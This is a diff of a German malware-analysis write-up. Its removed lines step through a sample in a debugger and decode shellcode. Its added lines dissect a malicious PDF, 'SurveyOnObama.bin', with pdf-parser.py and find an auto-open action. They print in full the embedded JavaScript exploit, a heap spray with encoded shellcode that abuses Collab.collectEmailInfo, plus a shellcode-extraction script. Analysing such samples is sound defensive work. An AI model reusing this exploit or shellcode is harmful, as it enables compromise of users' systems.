@@ -1,178 +1,356 @@
-1. Das EIP (Entry Instruction Pointer) wurde manuell auf die Adresse 0x00401000 gesetzt.
+## 1.Dateityp-Identifikation
 
-2. Wir haben mehrmals den Befehl "Step Over" verwendet, bis wir die Adresse 0x00401037 erreicht haben.
-➤ Was sich geändert hat:
-Der Funktionsname wurde manuell zu "CreateFileA" umbenannt, um die Lesbarkeit und Analyse zu erleichtern.
-Der Wert von EAX hat sich von 0x00000000 auf 0x000000EC geändert.
+Wir haben den Befehl `file SurveyOnObama.bin` im Terminal unter Ubuntu Subsystem ausgeführt. Die Ausgabe war:
 
-3. Wir haben weiterhin den Befehl "Step Over" ausgeführt, bis wir die Adresse 0x0040105E erreicht haben. Dort blieb die Ausführung jedoch blockiert und konnte nicht fortgesetzt werden. Erst nachdem im Speicher vollständiger Zugriff (Full Access) auf die Adresse 0x0040105E gewährt wurde, konnte die Analyse mit dem nächsten Schritt fortgesetzt werden.
-➤ Was sich geändert hat:
-EAX = 0x00000CB5 ⇒ AL = 0xB5 (niedrigstes Byte von AX)
-Wert 0xB5 wurde in den Speicher geschrieben
-EDI = 0x00401069 (Zieladresse)
-ESI = 0x0040106A (Quelladresse oder nächste Instruktion)
-ECX = 0x017C (380 dezimal)
-
-4. Wir haben weiterhin den Befehl "Step Over" verwendet, bis wir erneut die Adresse 0x0040105E erreicht haben, an der die Instruktion "STOSB" (AA) ausgeführt wurde. STOSB speichert ein Byte aus dem Register AL in eine bestimmte Speicheradresse.
-
-Die Adresse 0x0040105E befindet sich innerhalb einer Schleife, die wie folgt aufgebaut ist:
-
-```
-0040104C | AC            | LODSB         ; lädt ein Byte von [ESI] in AL
-0040104D | 66:2D 6100    | SUB AX, 0x61  ; Subtrahiert 0x61 von AX
-00401051 | 66:C1E0 04    | SHL AX, 4     ; Shiftet AX um 4 Bit nach links
-00401055 | 66:8BD0       | MOV DX, AX    ; Kopiert AX nach DX
-00401058 | AC            | LODSB         ; Lädt nächstes Byte in AL
-00401059 | 2C 61         | SUB AL, 0x61  ; Subtrahiert 0x61 von AL
-0040105B | 66:03C2       | ADD AX, DX    ; Addiert DX zu AX
-0040105E | AA            | STOSB         ; Speichert AL in [EDI]
-0040105F | 49            | DEC ECX       ; Dekrementiert ECX
-00401060 | 75 EA         | JNE 0040104C  ; Springt zurück, wenn ECX ≠ 0
+```bash
+SurveyOnObama.bin: PDF document, version 1.5
 ```
 
-Die Schleife liest bei jeder Iteration zwei kodierte Zeichen, wandelt sie in einen binären Wert (4 Bit + 4 Bit) um, und schreibt das resultierende Byte in einen Speicherpuffer.
-Dieser Vorgang wird 380 Mal wiederholt (ECX = 0x017C), um ein Payload aus 760 Zeichen zu rekonstruieren.
+Das bedeutet, dass unsere Datei vom Typ **PDF** ist.
 
-5. Wir haben weiterhin "Step Over" verwendet, bis wir die Adresse 0x0040106A erreicht haben. Dort wurde die Instruktion "IN AL, DX" (Opcode: EC) ausgeführt.
 
-Die Instruktion "IN AL, DX" liest ein Byte von einem I/O-Port, dessen Adresse im Register DX gespeichert ist, und speichert es im Register AL.
+## 2. Verwendung von pdf-parser.py
 
-Um zu analysieren, worauf genau diese Instruktion zugreift, haben wir die verschlüsselte Zeichenkette ab der Adresse ESI = 0x0040106A extrahiert und mit einem Python-Skript entschlüsselt.
+Für die Analyse benötigen wir das Tool `pdf-parser.py`, das wir von GitHub herunterladen:
 
-Das verwendete Python-Skript:
+🔗 https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py
+
+Nachdem das Tool heruntergeladen wurde, führen wir den folgenden Befehl im Terminal aus:
+
+```bash
+python3 pdf-parser.py -f -a SurveyOnObama.bin
+```
+
+### Erklärung der Optionen:
+
+- `-f`, `--filter`: wendet automatische Dekompression an (FlateDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode und RunLengthDecode)
+- `-a`, `--stats`: zeigt statistische Informationen über die PDF-Dokumentstruktur an
+
+Die Ausgabe war:
+```bash
+This program has not been tested with this version of Python (3.13.3)
+Should you encounter problems, please use Python version 3.12.2
+Comment: 146
+XREF: 8
+Trailer: 8
+StartXref: 4
+Indirect object: 52
+Indirect objects with a stream: 25, 26, 27, 19, 24, 33, 31, 32, 25, 26, 27, 19, 24, 33, 31, 32
+  24: 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31, 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31
+ /Catalog 4: 16, 16, 16, 16
+ /ExtGState 2: 22, 22
+ /Font 2: 20, 20
+ /FontDescriptor 2: 21, 21
+ /Metadata 4: 24, 32, 24, 32
+ /ObjStm 4: 25, 26, 25, 26
+ /Page 4: 18, 18, 18, 18
+ /Pages 2: 4, 4
+ /XRef 4: 27, 33, 27, 33
+Unreferenced indirect objects: 9 0 R, 11 0 R, 25 0 R, 26 0 R, 27 0 R, 28 0 R, 33 0 R
+Unreferenced indirect objects without /ObjStm objects: 9 0 R, 11 0 R, 27 0 R, 28 0 R, 33 0 R
+Search keywords:
+ /JS 2: 29, 29
+ /JavaScript 2: 29, 29
+ /AA 2: 18, 18
+```
+
+=> Das Ergebnis zeigte, dass die Datei JavaScript enthält und Aktionen automatisch ausführen kann
+
+
+## 3. Analyse von Objekt 29 (JavaScript-Verweis)
+
+Dann haben wir uns Objekt 29 genauer angeschaut, da es sich um einen möglichen JavaScript-Verweis handelt. Dazu führten wir folgenden Befehl aus:
+
+```bash
+python3 pdf-parser.py -o 29 SurveyOnObama.bin
+```
+
+### Erklärung der Option:
+
+- `-o`, `--objstm`: analysiert den Inhalt eines bestimmten Objekt-Streams (z. B. JavaScript, eingebettete Streams)
+
+Die Ausgabe war:
+```bash
+This program has not been tested with this version of Python (3.13.3)
+Should you encounter problems, please use Python version 3.12.2
+obj 29 0
+ Type:
+ Referencing: 31 0 R
+
+  <<
+    /S /JavaScript
+    /JS 31 0 R
+  >>
+
+
+obj 29 0
+ Type:
+ Referencing: 31 0 R
+
+  <<
+    /S /JavaScript
+    /JS 31 0 R
+  >>
+```
+
+=> Man sieht, dass es auf Objekt 31 verweist
+
+
+## 4. Analyse von Objekt 18 (Seite mit automatischer Aktion)
+
+Danach haben wir Objekt 18 untersucht, da es sich um die Seite handelt, auf der eine automatische Aktion definiert ist. Der verwendete Befehl lautet:
+
+```bash
+python3 pdf-parser.py -o 18 SurveyOnObama.bin
+```
+
+Die Ausgabe war:
+```bash
+This program has not been tested with this version of Python (3.13.3)
+Should you encounter problems, please use Python version 3.12.2
+obj 18 0
+ Type: /Page
+ Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R
+
+  <<
+    /Contents 19 0 R
+    /Type /Page
+    /Parent 4 0 R
+    /Rotate 0
+    /MediaBox [0 0 595 842]
+    /CropBox [0 0 595 842]
+    /Resources
+      <<
+        /Font
+          <<
+            /TT0 20 0 R
+          >>
+        /ProcSet [/PDF/Text]
+        /ExtGState
+          <<
+            /GS0 22 0 R
+          >>
+      >>
+    /StructParents 0
+  >>
+
+
+obj 18 0
+ Type: /Page
+ Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R
+
+  <<
+    /Contents 19 0 R
+    /Type /Page
+    /Parent 4 0 R
+    /Rotate 0
+    /MediaBox [0 0 595 842]
+    /CropBox [0 0 595 842]
+    /Resources
+      <<
+        /Font
+          <<
+            /TT0 20 0 R
+          >>
+        /ProcSet [/PDF/Text]
+        /ExtGState
+          <<
+            /GS0 22 0 R
+          >>
+      >>
+    /AA
+      <<
+        /O 29 0 R
+      >>
+    /StructParents 0
+  >>
+
+
+obj 18 0
+ Type: /Page
+ Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R
+
+  <<
+    /Contents 19 0 R
+    /Type /Page
+    /Parent 4 0 R
+    /Rotate 0
+    /MediaBox [0 0 595 842]
+    /CropBox [0 0 595 842]
+    /Resources
+      <<
+        /Font
+          <<
+            /TT0 20 0 R
+          >>
+        /ProcSet [/PDF/Text]
+        /ExtGState
+          <<
+            /GS0 22 0 R
+          >>
+      >>
+    /StructParents 0
+  >>
+
+
+obj 18 0
+ Type: /Page
+ Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R
+
+  <<
+    /Contents 19 0 R
+    /Type /Page
+    /Parent 4 0 R
+    /Rotate 0
+    /MediaBox [0 0 595 842]
+    /CropBox [0 0 595 842]
+    /Resources
+      <<
+        /Font
+          <<
+            /TT0 20 0 R
+          >>
+        /ProcSet [/PDF/Text]
+        /ExtGState
+          <<
+            /GS0 22 0 R
+          >>
+      >>
+    /AA
+      <<
+        /O 29 0 R
+      >>
+    /StructParents 0
+  >>
+```
+
+=> Man sieht die `/AA /O`-Aktion, die Objekt 29 aufruft.
+
+
+## 5. Analyse von Objekt 31 (JavaScript-Inhalt)
+
+Anschließend haben wir die Struktur von Objekt 31 geprüft mit folgendem Befehl:
+
+```bash
+python3 pdf-parser.py -o 31 SurveyOnObama.bin
+```
+
+Die Ausgabe war:
+```bash
+This program has not been tested with this version of Python (3.13.3)
+Should you encounter problems, please use Python version 3.12.2
+obj 31 0
+ Type:
+ Referencing: 30 0 R
+ Contains stream
+
+  <<
+    /Length 30 0 R
+    /Filter [/FlateDecode]
+  >>
+
+
+obj 31 0
+ Type:
+ Referencing: 30 0 R
+ Contains stream
+
+  <<
+    /Length 30 0 R
+    /Filter [/FlateDecode]
+  >>
+```
+
+=> Man sieht, dass es einen komprimierten Stream enthält (`/Filter [/FlateDecode]`).
+
+
+## 6. Extraktion und Dekompression des JavaScript-Codes
+
+Zuletzt haben wir den eigentlichen JavaScript-Code aus Objekt 31 sichtbar gemacht und dekomprimiert mit folgendem Befehl:
+
+```bash
+python3 pdf-parser.py -o 31 -f SurveyOnObama.bin
+```
+
+Die Ausgabe war:
+```bash
+This program has not been tested with this version of Python (3.13.3)
+Should you encounter problems, please use Python version 3.12.2
+obj 31 0
+ Type:
+ Referencing: 30 0 R
+ Contains stream
+
+  <<
+    /Length 30 0 R
+    /Filter [/FlateDecode]
+  >>
+
+ b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'
+
+obj 31 0
+ Type:
+ Referencing: 30 0 R
+ Contains stream
+
+  <<
+    /Length 30 0 R
+    /Filter [/FlateDecode]
+  >>
+
+ b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'
+
+
+```
+
+=> Der JavaScript-Code verwendet `unescape()` und eine Funktion `re()` zum Dekodieren von Shellcode, der in Unicode-Zeichen versteckt ist. Am Ende wird der Code mit `app.setTimeOut("sopen", 1200)` ausgeführt.
+
+## 7. Extraktion des Shellcodes aus JavaScript
+
+Um den Shellcode zu extrahieren, schreiben wir ein Python-Skript, das die `%uXXXX`-Werte in rohe Bytes umwandelt. Das Ergebnis wird in einer Datei `shellcode_extracted.bin` gespeichert.
+
+### Dateiname: `extract_shellcode.py`
 
 ```python
-encoded = "Yl_mYd_mfmfdfgfh]hef`abbaaaaaa_jboabaaaaYpef`mge[bdaaaaaaaYleaamYlhabm[nYlfiaiYjfn_mYlen`aYlhn`mfbYlef_mYlhadmYlheaghiad`afgYlhgcaad`add]jejeb[nadef_mdd^lap\\\\obadk^gheai]b]lanad^kea_l`bdlbphf_gfoYlfoceadfn_mggYlamelYlfobmadfn_mYlaeYladef_m[lfj_c\\\\fdd]aYjef_iYjef_eYdef_eaegkaaYlef_efaYlen`m`pfbbaYjef`eYdhn`e`phegnYbhn`eaacaaaaahnac_lgcgkeagiaabaaaaaYlff`efcgkaaYlef`m`pfadeYjef`igkaagkaagkaaYlen_efbYlff`m`pfcdagkaaYnef_ifaYlen`efbYlff`ifcYlef_efaYlen`m`pfbcmYlff`iadff`eYbhk`mgfgpggakhfac_lcagiaaYaaaaaYle"
+import re
 
-data = [ord(c) for c in encoded]
+# Raw JavaScript shellcode in %uXXXX format
+data = '''%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f'''
 
-def decrypt(data):
-    decrypted = bytearray()
-    i = 0
-    while i < len(data) - 1:
-        a = data[i]
-        b = data[i + 1]
-        val = ((a - 0x61) << 4) + (b - 0x61)
-        decrypted.append(val & 0xFF) 
-        i += 2
-    return decrypted
+shellcode = b""
 
-decrypted_bytes = decrypt(data)
+# Extract %uXXXX pairs using regex
+matches = re.findall(r"%u([0-9a-fA-F]{4})", data)
 
-with open("decrypted_output.bin", "wb") as f:
-    f.write(decrypted_bytes)
+for match in matches:
+    # Convert to bytes in little-endian format
+    bytes_le = bytes.fromhex(match)
+    shellcode += bytes([bytes_le[1], bytes_le[0]])
+
+# Write the decoded shellcode to a binary file
+with open("shellcode.bin", "wb") as f:
+    f.write(shellcode)
 ```
 
-Das Skript generierte die Datei decrypted_output.bin, welche den entschlüsselten Shellcode enthält, der ursprünglich an der Adresse ESI = 0040106A gespeichert war.
+Nach dem Ausführen dieses Skripts mit:
 
-Wir haben dann das Tool ndisasm verwendet, um diesen Binärcode zu disassemblieren. Das hat uns ermöglicht, die genaue Funktion der IN AL, DX-Instruktion zu erkennen. Die Ausgabe war wie folgt:
-```asm
-00000000  8BEC              mov bp,sp
-00000002  83EC5C            sub sp,byte +0x5c
-00000005  53                push bx
-00000006  56                push si
-00000007  57                push di
-00000008  C745F01100        mov word [di-0x10],0x11
-0000000D  0000              add [bx+si],al
-0000000F  E91E01            jmp 0x130
-00000012  0000              add [bx+si],al
-00000014  8F45FC            pop word [di-0x4]
-00000017  64A13000          mov ax,[fs:0x30]
-0000001B  0000              add [bx+si],al
-0000001D  8B400C            mov ax,[bx+si+0xc]
-00000020  8B701C            mov si,[bx+si+0x1c]
-00000023  AD                lodsw
-00000024  8B5808            mov bx,[bx+si+0x8]
-00000027  895DEC            mov [di-0x14],bx
-0000002A  8B4DF0            mov cx,[di-0x10]
-0000002D  8B7DFC            mov di,[di-0x4]
-00000030  51                push cx
-00000031  8B45EC            mov ax,[di-0x14]
-00000034  8B703C            mov si,[bx+si+0x3c]
-00000037  8B7406            mov si,[si+0x6]
-0000003A  7803              js 0x3f
-0000003C  F056              lock push si
-0000003E  8B7620            mov si,[bp+0x20]
-00000041  03F0              add si,ax
-00000043  33C9              xor cx,cx
-00000045  49                dec cx
-00000046  41                inc cx
-00000047  AD                lodsw
-00000048  0345EC            add ax,[di-0x14]
-0000004B  33DB              xor bx,bx
-0000004D  0FABE1            bts cx,sp
-00000050  039D6740          add bx,[di+0x4067]
-00000054  7C0C              jl 0x62
-00000056  B0D0              mov al,0xd0
-00000058  2DA4FE            sub ax,0xfea4
-0000005B  AF                scasw
-0000005C  13B1F74E          adc si,[bx+di+0x4ef7]
-00000060  65D8B5E240        fdiv dword [gs:di+0x40e2]
-00000065  35CEC6            xor ax,0xc6ce
-00000068  58                pop ax
-00000069  B0C4              mov al,0xc4
-0000006B  A8B5              test al,0xb5
-0000006D  E1C0              loope 0x2f
-0000006F  35CEB8            xor ax,0xb8ce
-00000072  B038              mov al,0x38
-00000074  B034              mov al,0x34
-00000076  4E                dec si
-00000077  BAB58E            mov dx,0x8eb5
-0000007A  1BB533C0          sbb si,[di-0x3fcd]
-0000007E  8945E8            mov [di-0x18],ax
-00000081  8945E4            mov [di-0x1c],ax
-00000084  8345E404          add word [di-0x1c],byte +0x4
-00000088  6A00              push byte +0x0
-0000008A  8B45E4            mov ax,[di-0x1c]
-0000008D  50                push ax
-0000008E  8B4DFC            mov cx,[di-0x4]
-00000091  FF5110            call [bx+di+0x10]
-00000094  8945F4            mov [di-0xc],ax
-00000097  837DF4FF          cmp word [di-0xc],byte -0x1
-0000009B  746D              jz 0x10a
-0000009D  817DF40020        cmp word [di-0xc],0x2000
-000000A2  0000              add [bx+si],al
-000000A4  7D02              jnl 0xa8
-000000A6  EB62              jmp short 0x10a
-000000A8  6A40              push byte +0x40
-000000AA  680010            push word 0x1000
-000000AD  0000              add [bx+si],al
-000000AF  8B55F4            mov dx,[di-0xc]
-000000B2  52                push dx
-000000B3  6A00              push byte +0x0
-000000B5  8B45FC            mov ax,[di-0x4]
-000000B8  FF5034            call [bx+si+0x34]
-000000BB  8945F8            mov [di-0x8],ax
-000000BE  6A00              push byte +0x0
-000000C0  6A00              push byte +0x0
-000000C2  6A00              push byte +0x0
-000000C4  8B4DE4            mov cx,[di-0x1c]
-000000C7  51                push cx
-000000C8  8B55FC            mov dx,[di-0x4]
-000000CB  FF5230            call [bp+si+0x30]
-000000CE  6A00              push byte +0x0
-000000D0  8D45E8            lea ax,[di-0x18]
-000000D3  50                push ax
-000000D4  8B4DF4            mov cx,[di-0xc]
-000000D7  51                push cx
-000000D8  8B55F8            mov dx,[di-0x8]
-000000DB  52                push dx
-000000DC  8B45E4            mov ax,[di-0x1c]
-000000DF  50                push ax
-000000E0  8B4DFC            mov cx,[di-0x4]
-000000E3  FF512C            call [bx+di+0x2c]
-000000E6  8B55F8            mov dx,[di-0x8]
